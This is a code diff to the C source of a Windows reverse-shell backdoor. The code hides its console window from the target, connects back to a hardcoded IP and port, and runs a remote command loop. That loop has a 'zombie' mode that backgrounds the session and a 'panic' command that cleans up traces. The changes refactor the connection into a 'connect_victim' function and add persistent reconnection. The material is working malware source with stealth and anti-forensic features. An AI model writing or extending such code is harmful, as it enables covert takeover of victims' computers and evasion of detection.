@@ -17,6 +17,7 @@
 int sock;
 unsigned short ServPort = 50005;//Server Port
 char *ServIP  = "192.168.174.129";//Server IP
+int zombie_bool = 0;//If shell mode is enabled
 
 void zombie(){
 	closesocket(sock);
@@ -55,7 +56,7 @@ int bootRun(){
 	return 0;
 }
 
-//STRCUT used for cd command
+//STRCUT used for cuting aruents out of commands
 //pre: String str is a char array containing string to cut, slice from is the position from wich we will cut, slice to is the position final character
 //post: Returns pointer to char array wich contains cut string
 char *
@@ -96,8 +97,8 @@ void Shell(){ //Once connected execute custom commands or bash
 	char buffer[1024];
 	char container[1024];
 	char total_response[18384];
-	int shell = 1;//If shell mode is enabled
-	while (shell == 1) {
+	int sh_bool = 1;
+	while (sh_bool == 1) {
  		 jump:
 		 bzero(buffer,1024);
 		 bzero(container, sizeof(container));
@@ -118,7 +119,8 @@ void Shell(){ //Once connected execute custom commands or bash
 		else if(strncmp("zombie", buffer, 6) == 0){//Use "zombie" to background current session
 			char zomb[128] = "Zombie Mode Enabled \n";
 			send(sock, zomb, sizeof(zomb),0);
-			shell = 0;
+			zombie_bool= 1;
+			sh_bool = 0;
 		}
 		else if(strncmp("panic", buffer, 5) == 0){//Use "panic" to clean up all tracks and terminate connection
 			char panic[128] = "Cleaning Up and Exiting ... \n";
@@ -135,14 +137,8 @@ void Shell(){ //Once connected execute custom commands or bash
     		}
 	}
 }
+void connect_victim(){
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
-	//1) HIDE PROCESS FROM TARGET
-	HWND stealth;
-	AllocConsole();
-	stealth = FindWindow("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
-	//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
 	struct sockaddr_in ServAddr;
 
 	WSADATA wsaData;
@@ -160,9 +156,21 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		Sleep(30);
 		goto start;
 	}
-	//4)If connection was succesful  EXECUTE SHELL funciont (main functionalities) 
-	Shell();
-	//End of execution
-	goto start;
 
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
+	//1) HIDE PROCESS FROM TARGET
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindow("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+	do{
+		//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
+		connect_victim();
+		//4)If connection was succesful  EXECUTE SHELL funciont (main functionalities) 
+		Shell();
+	}while(zombie_bool==1);
+	//End of execution
+	exit(0);
 }
